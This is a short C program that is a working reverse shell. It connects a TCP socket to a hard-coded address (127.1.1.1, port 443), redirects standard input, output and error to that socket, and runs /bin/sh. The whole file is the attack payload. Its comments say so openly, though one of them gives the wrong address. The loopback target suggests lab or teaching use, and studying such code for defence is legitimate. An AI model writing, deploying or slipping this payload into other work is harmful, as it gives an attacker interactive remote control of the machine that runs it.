#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(){
	// variables declaration
	int svrfd;
	struct sockaddr_in svrAddr;

	// reverse shell details
	svrAddr.sin_family = AF_INET; // to use IPv4
	svrAddr.sin_port = htons(443); // to connect to port 443
	svrAddr.sin_addr.s_addr = inet_addr("127.1.1.1"); // to connect to host 127.0.0.1

	// socket section
	svrfd = socket(AF_INET, SOCK_STREAM, 0); // to create a IPv4 TCP socket
	connect(svrfd, (struct sockaddr*)&svrAddr, sizeof(svrAddr));// to connect to 127.0.0.1:443 using IPv4

	// to redirect stdin, stdout, stderr
	dup2(svrfd, 0);
	dup2(svrfd, 1);
	dup2(svrfd, 2);

	// to execute a sh shell
	execve("/bin/sh", NULL, NULL);
	close(svrfd);

	return 0;

}
